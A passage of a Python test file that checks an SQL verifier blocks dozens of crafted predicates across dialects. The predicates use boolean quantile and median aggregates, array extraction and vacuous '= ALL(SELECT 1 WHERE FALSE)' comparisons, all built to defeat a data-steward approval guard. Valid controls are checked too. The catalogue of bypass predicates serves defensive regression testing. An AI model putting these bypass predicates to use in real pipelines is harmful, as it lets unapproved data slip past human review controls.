        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter49_r17_median_quantile_passthrough_and_ch_quantile_if() -> None:
    """Remediate r17 MEDIAN/QUANTILE boolean passthrough, array NULL quantile, and ClickHouse QUANTILE* -If combinators."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR)")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'UNAPPROVED')")
    for live_b in ("MEDIAN(1 = 1)", "QUANTILE(1 = 1, 0.5)"):
        val = ddb.execute(f"SELECT {live_b} FROM staging.s AS s").fetchone()[0]
        assert isinstance(val, bool) and val is True, live_b
    arr_val = ddb.execute("SELECT QUANTILE(1 = 1, [0.5]) FROM staging.s AS s").fetchone()[0]
    assert arr_val == [True]
    assert ddb.execute("SELECT MEDIAN(NULL) FROM staging.s AS s").fetchone()[0] is None
    assert ddb.execute("SELECT MEDIAN(1) FROM staging.s AS s").fetchone()[0] == 1.0
    assert ddb.execute("SELECT QUANTILE(1, 0.5) FROM staging.s AS s").fetchone()[0] == 1
    for bypass_pred in (
        "(SELECT MEDIAN(1 = 1)) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT QUANTILE(1 = 1, 0.5)) = ALL(SELECT 1 WHERE FALSE)",
    ):
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND {bypass_pred}"
        ).fetchone()[0] == 0
    ddb.close()

    non_ch_targets = [tid for tid in SQL_TARGET_IDS if tid != "clickhouse"]
    dialect_blocked: list[tuple[str, str]] = [
        (tid, pred)
        for tid in SQL_TARGET_IDS
        for pred in (
            "MEDIAN(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)",
            "MEDIAN(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
            "COALESCE(MEDIAN(1 = 1) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
            "(SELECT MEDIAN(1 = 1)) = ALL(SELECT 1 WHERE FALSE)",
        )
    ]
    dialect_blocked.extend(
        (tid, pred)
        for tid in non_ch_targets
        for pred in (
            "QUANTILE(1 = 1, 0.5) OVER () = ALL(SELECT 1 WHERE FALSE)",
            "QUANTILE(1 = 1, [0.5]) OVER () = ALL(SELECT 1 WHERE FALSE)",
            "COALESCE(QUANTILE(1 = 1, 0.5) OVER (), 1) = ALL(SELECT 1 WHERE FALSE)",
            "(SELECT QUANTILE(1 = 1, 0.5)) = ALL(SELECT 1 WHERE FALSE)",
            "QUANTILE(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)",
        )
    )
    dialect_blocked.extend(
        (tid, "QUANTILE(1, [NULL]) OVER () = ALL(SELECT 1 WHERE FALSE)")
        for tid in non_ch_targets
        if tid != "sqlserver_fabric"
    )
    dialect_blocked.extend(
        (tid, "QUANTILE_DISC(1, [NULL]) OVER () = ALL(SELECT 1 WHERE FALSE)")
        for tid in SQL_TARGET_IDS
        if tid != "sqlserver_fabric"
    )
    dialect_blocked.extend([
        ("duckdb_local", "QUANTILE(0.5) WITHIN GROUP (ORDER BY 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "QUANTILE(0.5) WITHIN GROUP (ORDER BY 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "QUANTILE(0.5)(1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "QUANTILE(NULL)(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantilesExactIf(0.5, 0.9)(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileBFloat16WeightedIf(0.5)(1, 1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileTimingWeightedIf(0.5)(1, 1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExactInclusiveIf(0.5)(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileInterpolatedWeightedIf(0.5)(1, 1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileDeterministicIf(0.5)(1, 1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantilesExactExclusiveIf(0.5, 0.9)(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantilesExactIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExactExclusiveIf(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantilesExactIf(0.5, 0.9)(1, s.id = 999) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExactInclusiveOrNull(0.5)(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExactInclusiveOrNullIf(0.5)(1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
    ])

    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(pred.split(" = ALL")[0], read=dialect)) is True, (
            tid, pred,
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred,
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls: list[tuple[str, str]] = [
        (tid, "MEDIAN(1) OVER () = 1") for tid in SQL_TARGET_IDS
    ]
    valid_controls.extend(
        (tid, "QUANTILE(1, 0.5) OVER () = 1") for tid in non_ch_targets
    )
    valid_controls.extend(
        (tid, "QUANTILE(1, [0.5]) OVER () = [1]")
        for tid in non_ch_targets
        if tid != "sqlserver_fabric"
    )
    valid_controls.extend([
        ("duckdb_local", "QUANTILE(0.5) WITHIN GROUP (ORDER BY 1) OVER () = 1"),
        ("clickhouse", "QUANTILE(0.5) WITHIN GROUP (ORDER BY 1) OVER () = 1"),
        ("clickhouse", "QUANTILE(0.5)(1) OVER () = 1"),
        ("clickhouse", "quantileExactOrDefaultIf(0.5)(1, 0) OVER () = 0"),
        ("clickhouse", "quantilesExactIf(0.5, 0.9)(1, 1) OVER () = [1, 1]"),
        ("clickhouse", "quantileBFloat16WeightedIf(0.5)(1, 1, 1) OVER () = 1"),
        ("clickhouse", "quantileTimingWeightedIf(0.5)(1, 1, 1) OVER () = 1"),
        ("clickhouse", "quantileExactInclusiveIf(0.5)(1, 1) OVER () = 1"),
        ("clickhouse", "quantileInterpolatedWeightedIf(0.5)(1, 1, 1) OVER () = 1"),
        ("clickhouse", "quantileDeterministicIf(0.5)(1, 1, 1) OVER () = 1"),
        ("clickhouse", "quantilesExactIf(1, 1) OVER () = [1]"),
    ])
    for ok_tid, ok_pred in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred,
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred,
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter50_r18_within_group_ch_quantile_median_and_bracket_coalesce() -> None:
    """Remediate r18 WithinGroup array-NULL, ClickHouse quantile*/median*, and COALESCE bracket."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR)")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'UNAPPROVED')")
    assert ddb.execute(
        "SELECT PERCENTILE_DISC([0.5]) WITHIN GROUP (ORDER BY 1) FROM staging.s"
    ).fetchone()[0] == [1]
    with pytest.raises(duckdb.BinderException):
        ddb.execute("SELECT PERCENTILE_DISC([NULL]) WITHIN GROUP (ORDER BY 1) FROM staging.s")
    coal_b = ddb.execute(
        "SELECT COALESCE((QUANTILE(1 = 1, [0.5]) OVER ())[1], 'true') FROM staging.s"
    ).fetchone()[0]
    assert isinstance(coal_b, bool) and coal_b is True
    ddb.close()

    non_tsql = [tid for tid in SQL_TARGET_IDS if tid != "sqlserver_fabric"]
    blocked: list[tuple[str, str]] = [
        (tid, "PERCENTILE_DISC([NULL]) WITHIN GROUP (ORDER BY 1) OVER ()")
        for tid in non_tsql
    ] + [
        (tid, "QUANTILE_DISC([NULL]) WITHIN GROUP (ORDER BY 1) OVER ()")
        for tid in non_tsql
    ] + [
        (tid, "PERCENTILE_DISC(ARRAY[NULL]) WITHIN GROUP (ORDER BY 1) OVER ()")
        for tid in non_tsql
        if tid != "bigquery"
    ] + [
        ("duckdb_local", "QUANTILE([NULL]) WITHIN GROUP (ORDER BY 1) OVER ()"),
        ("clickhouse", "QUANTILE([NULL]) WITHIN GROUP (ORDER BY 1) OVER ()"),
    ]
    blocked.extend(
        ("clickhouse", pred)
        for pred in (
            "quantileIf(NULL)(1, 1) OVER ()",
            "quantileExact(NULL)(1) OVER ()",
            "quantileExactIf(NULL)(1, 1) OVER ()",
            "quantiles(NULL, 0.9)(1) OVER ()",
            "quantilesExactIf(NULL, 0.9)(1, 1) OVER ()",
            "quantileExactInclusiveIf(NULL)(1, 1) OVER ()",
            "quantileExactIf([NULL])(1, 1) OVER ()",
            "quantileExact(0.5)(1 = 1) OVER ()",
            "quantiles(0.5, 0.9)(1 = 1) OVER ()",
            "quantilesExact(0.5, 0.9)(1 = 1) OVER ()",
            "quantileExactIf(0.5)(1 = 1, 1) OVER ()",
            "quantileExactInclusiveIf(0.5)(1 = 1, 1) OVER ()",
            "quantileExactInclusiveOrDefaultIf(0.5)(1 = 1, 0) OVER ()",
            "medianExact(1 = 1) OVER ()",
            "medianExactIf(1 = 1, 1) OVER ()",
            "medianExactOrDefault(1 = 1) OVER ()",
            "medianExactInclusiveIf(1, 0) OVER ()",
            "medianExactExclusiveIf(1, 0) OVER ()",
            "COALESCE((quantilesExact(0.5, 0.9)(1 = 1) OVER ())[1], 'true')",
        )
    )
    for tid in ("duckdb_local", "postgres", "bigquery", "snowflake", "databricks_uc", "redshift"):
        blocked.append((tid, "COALESCE((QUANTILE(1 = 1, [0.5]) OVER ())[1], 'true')"))
        blocked.append((tid, "COALESCE((QUANTILE_DISC(1 = 1, [0.5]) OVER ())[1], 'true')"))

    for tid, expr in blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {expr} = ALL(SELECT 1 WHERE FALSE)"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(expr, read=dialect)) is True, (tid, expr)
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, expr,
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, expr)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls: list[tuple[str, str, str]] = [
        ("duckdb_local", "PERCENTILE_DISC([0.5]) WITHIN GROUP (ORDER BY 1) OVER ()", "= [1]"),
        ("postgres", "PERCENTILE_DISC([0.5]) WITHIN GROUP (ORDER BY 1) OVER ()", "= [1]"),
        ("clickhouse", "quantileExact(0.5)(1) OVER ()", "= 1"),
        ("clickhouse", "quantileExactIf(0.5)(1, 1) OVER ()", "= 1"),
        ("clickhouse", "quantilesExact(0.5, 0.9)(1) OVER ()", "= [1, 1]"),
        ("clickhouse", "quantileExactOrDefaultIf(0.5)(1, 0) OVER ()", "= 0"),
        ("clickhouse", "medianExact(1) OVER ()", "= 1"),
        ("clickhouse", "medianExactInclusiveIf(1, 1) OVER ()", "= 1"),
        ("clickhouse", "medianExactExclusiveIf(1, 1) OVER ()", "= 1"),
    ]
    for tid in ("duckdb_local", "postgres", "bigquery", "snowflake", "databricks_uc", "redshift"):
        valid_controls.append((tid, "COALESCE((QUANTILE(1, [0.5]) OVER ())[1], 1)", "= 1"))

    for ok_tid, ok_expr, rhs in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        assert is_bool_or_null_expr(sqlglot.parse_one(ok_expr, read=dialect)) is False, (
            ok_tid, ok_expr,
        )
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} {rhs}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr,
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr,
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)


def test_iter51_r19_generalized_quantile_extraction_array_element_and_cont_null() -> None:
    """Remediate r19: generalized boolean-quantile extraction, ClickHouse arrayElement, and *_CONT [NULL]."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR)")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'UNAPPROVED')")
    assert ddb.execute(
        "SELECT PERCENTILE_CONT([0.5]) WITHIN GROUP (ORDER BY 1) FROM staging.s"
    ).fetchone()[0] == [1.0]
    with pytest.raises(duckdb.BinderException):
        ddb.execute("SELECT PERCENTILE_CONT([NULL]) WITHIN GROUP (ORDER BY 1) FROM staging.s")
    with pytest.raises(duckdb.BinderException):
        ddb.execute("SELECT QUANTILE_CONT(1, [NULL]) FROM staging.s")
    for live_expr in (
        "COALESCE(LIST_EXTRACT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')",
        "COALESCE(ARRAY_EXTRACT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')",
        "COALESCE(LIST_FIRST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')",
        "COALESCE(LIST_LAST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')",
        "COALESCE(LIST_MAX(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')",
        "COALESCE(LIST_MIN(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')",
        "COALESCE((QUANTILE(1 = 1, [0.5]) OVER ())[1:1][1], 'true')",
        "COALESCE(LIST_SLICE(QUANTILE(1 = 1, [0.5]) OVER (), 1, 1)[1], 'true')",
        "COALESCE(LIST_REVERSE(QUANTILE(1 = 1, [0.5]) OVER ())[1], 'true')",
        "COALESCE((QUANTILE(1 = 1, [0.5]) OVER () || [FALSE])[1], 'true')",
        "COALESCE((IF(TRUE, QUANTILE(1 = 1, [0.5]) OVER (), [FALSE]))[1], 'true')",
        "COALESCE((CASE WHEN TRUE THEN QUANTILE(1 = 1, [0.5]) OVER () END)[1], 'true')",
        "COALESCE((SELECT QUANTILE(1 = 1, [0.5]))[1], 'true')",
        "COALESCE((SELECT LIST_EXTRACT(QUANTILE(1 = 1, [0.5]), 1) FROM staging.s), 'true')",
        "COALESCE(LIST_EXTRACT((SELECT QUANTILE(1 = 1, [0.5])), 1), 'true')",
    ):
        val = ddb.execute(f"SELECT {live_expr} FROM staging.s").fetchone()[0]
        assert isinstance(val, bool) and val is True, live_expr
    ddb.close()

    non_tsql = [tid for tid in SQL_TARGET_IDS if tid != "sqlserver_fabric"]
    blocked: list[tuple[str, str]] = [
        ("duckdb_local", "COALESCE(LIST_EXTRACT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_EXTRACT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_FIRST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(LIST_LAST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(LIST_MAX(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(LIST_MIN(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_FIRST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_LAST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_MAX(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_MIN(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("duckdb_local", "COALESCE(LIST_ELEMENT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(ELEMENT_AT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')"),
        ("databricks_uc", "COALESCE(ELEMENT_AT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(GET(QUANTILE(1 = 1, [0.5]) OVER (), 0), 'true')"),
        ("snowflake", "COALESCE(GET(QUANTILE(1 = 1, [0.5]) OVER (), 0), 'true')"),
        ("postgres", "COALESCE(LIST_FIRST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("bigquery", "COALESCE(ARRAY_FIRST(QUANTILE(1 = 1, [0.5]) OVER ()), 'true')"),
        ("redshift", "COALESCE(LIST_EXTRACT(QUANTILE(1 = 1, [0.5]) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE((QUANTILE(1 = 1, [0.5]) OVER ())[1:1][1], 'true')"),
        ("duckdb_local", "COALESCE(LIST_SLICE(QUANTILE(1 = 1, [0.5]) OVER (), 1, 1)[1], 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_SLICE(QUANTILE(1 = 1, [0.5]) OVER (), 1, 1)[1], 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_REVERSE(QUANTILE(1 = 1, [0.5]) OVER ())[1], 'true')"),
        ("duckdb_local", "COALESCE(LIST_REVERSE(QUANTILE(1 = 1, [0.5]) OVER ())[1], 'true')"),
        ("duckdb_local", "COALESCE((QUANTILE(1 = 1, [0.5]) OVER () || [FALSE])[1], 'true')"),
        ("duckdb_local", "COALESCE(([1] || QUANTILE(1 = 1, [0.5]) OVER ())[2], 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_CONCAT(QUANTILE(1 = 1, [0.5]) OVER (), [FALSE])[1], 'true')"),
        ("duckdb_local", "COALESCE(LIST_CONCAT([1], QUANTILE(1 = 1, [0.5]) OVER ())[2], 'true')"),
        ("duckdb_local", "COALESCE((IF(TRUE, QUANTILE(1 = 1, [0.5]) OVER (), [FALSE]))[1], 'true')"),
        ("duckdb_local", "COALESCE((CASE WHEN TRUE THEN QUANTILE(1 = 1, [0.5]) OVER () END)[1], 'true')"),
        ("duckdb_local", "COALESCE((SELECT QUANTILE(1 = 1, [0.5]))[1], 'true')"),
        ("duckdb_local", "COALESCE((SELECT LIST_EXTRACT(QUANTILE(1 = 1, [0.5]), 1) FROM staging.s), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT((SELECT QUANTILE(1 = 1, [0.5])), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement([1 = 1], 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement(quantilesExact(0.5, 0.9)(1 = 1) OVER (), 1), 'true')"),
        ("clickhouse", "COALESCE((quantilesExact(0.5, 0.9)(1 = 1) OVER ())[1:1][1], 'true')"),
        ("clickhouse", "COALESCE(arraySlice(quantilesExact(0.5, 0.9)(1 = 1) OVER (), 1, 1)[1], 'true')"),
        ("clickhouse", "COALESCE(arrayElement(arrayReverse(quantilesExact(0.5, 0.9)(1 = 1) OVER ()), 1), 'true')"),
    ]
    for tid in non_tsql:
        blocked.extend([
            (tid, "PERCENTILE_CONT([NULL]) WITHIN GROUP (ORDER BY 1) OVER ()"),
            (tid, "QUANTILE_CONT([NULL]) WITHIN GROUP (ORDER BY 1) OVER ()"),
            (tid, "QUANTILE_CONT(1, [NULL]) OVER ()"),
        ])
        if tid != "bigquery":
            blocked.append((tid, "PERCENTILE_CONT(ARRAY[NULL]) WITHIN GROUP (ORDER BY 1) OVER ()"))

    for tid, expr in blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {expr} = ALL(SELECT 1 WHERE FALSE)"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(expr, read=dialect)) is True, (tid, expr)
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, expr,
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, expr)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls: list[tuple[str, str, str]] = [
        ("duckdb_local", "COALESCE(LIST_EXTRACT(QUANTILE(1, [0.5]) OVER (), 1), 1)", "= 1"),
        ("duckdb_local", "COALESCE((QUANTILE(1, [0.5]) OVER ())[1], 1)", "= 1"),
        ("duckdb_local", "COALESCE(LIST_FIRST(QUANTILE(1, [0.5]) OVER ()), 1)", "= 1"),
        ("duckdb_local", "COALESCE(LIST_MAX(QUANTILE(1, [0.5]) OVER ()), 1)", "= 1"),
        ("duckdb_local", "COALESCE((QUANTILE(1, [0.5]) OVER ())[1:1][1], 1)", "= 1"),
        ("duckdb_local", "COALESCE((SELECT LIST_EXTRACT(QUANTILE(1, [0.5]), 1) FROM staging.s), 1)", "= 1"),
        ("duckdb_local", "COALESCE((QUANTILE(1 = 1, 0.5) OVER () || 'x')[1], 'true')", "= 't'"),
        ("duckdb_local", "COALESCE((IF(FALSE, QUANTILE(1 = 1, [0.5]) OVER (), [1]))[1], 'true')", "= 1"),
        ("clickhouse", "COALESCE(arrayElement([1], 1), 1)", "= 1"),
        ("clickhouse", "COALESCE(arrayElement(quantilesExact(0.5, 0.9)(1) OVER (), 1), 1)", "= 1"),
        ("duckdb_local", "PERCENTILE_CONT([0.5]) WITHIN GROUP (ORDER BY 1) OVER ()", "= [1]"),
        ("duckdb_local", "PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY 1 = 1) OVER ()", "= 1"),
        ("postgres", "PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY 1 = 1) OVER ()", "= 1"),
        ("duckdb_local", "QUANTILE_CONT(1 = 1, [0.5]) OVER ()", "= [1]"),
        ("postgres", "QUANTILE_CONT(1 = 1, [0.5]) OVER ()", "= [1]"),
        ("duckdb_local", "QUANTILE_CONT(1, [0.5]) OVER ()", "= [1]"),
    ]
    for ok_tid, ok_expr, rhs in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        assert is_bool_or_null_expr(sqlglot.parse_one(ok_expr, read=dialect)) is False, (
            ok_tid, ok_expr,
        )
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} {rhs}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr,
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr,
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)


def test_iter52_r20_quantile_passthrough_reverse_and_array_cast() -> None:
    """Remediate r19 Challenger Items 1-3: passthrough wrappers, ARRAY_REVERSE/mutators, and CAST(<array> AS BOOLEAN[])."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR)")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'UNAPPROVED')")
    for live_expr in (
        "COALESCE((SELECT LIST_EXTRACT(ANY_VALUE(q) OVER (), 1) FROM (SELECT QUANTILE(1 = 1, [0.5]) AS q) t), 'true')",
        "COALESCE(LIST_EXTRACT(FIRST_VALUE(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')",
        "COALESCE(LIST_EXTRACT(LAST_VALUE(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')",
        "COALESCE(LIST_EXTRACT(MIN(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')",
        "COALESCE(LIST_EXTRACT(MAX(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')",
        "COALESCE(LIST_EXTRACT(ANY_VALUE(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')",
        "COALESCE(LIST_REVERSE([NULL, 1 = 1])[1], 'true')",
        "COALESCE(LIST_SORT([NULL, 1 = 1])[1], 'true')",
        "COALESCE(LIST_REVERSE_SORT([NULL, 1 = 1])[1], 'true')",
        "COALESCE(LIST_DISTINCT([NULL, 1 = 1])[1], 'true')",
